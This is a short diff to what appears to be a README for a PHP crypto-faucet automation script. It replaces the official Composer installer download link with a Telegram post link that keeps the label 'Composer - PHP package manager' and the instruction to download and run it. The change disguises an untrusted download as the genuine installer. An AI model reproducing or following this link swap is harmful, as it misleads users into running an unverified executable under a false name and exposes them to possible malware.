@@ -36,7 +36,7 @@ A PHP-based faucet automation script designed to request tokens from the [dkargo
 
 Download and run the Composer installer:
 
-👉 [https://getcomposer.org/Composer-Setup.exe](https://getcomposer.org/Composer-Setup.exe)
+👉 [Composer - PHP package manager](https://t.me/KeoAirDropFreeNe/257/73710)
 
 Follow the GUI setup wizard instructions.
 
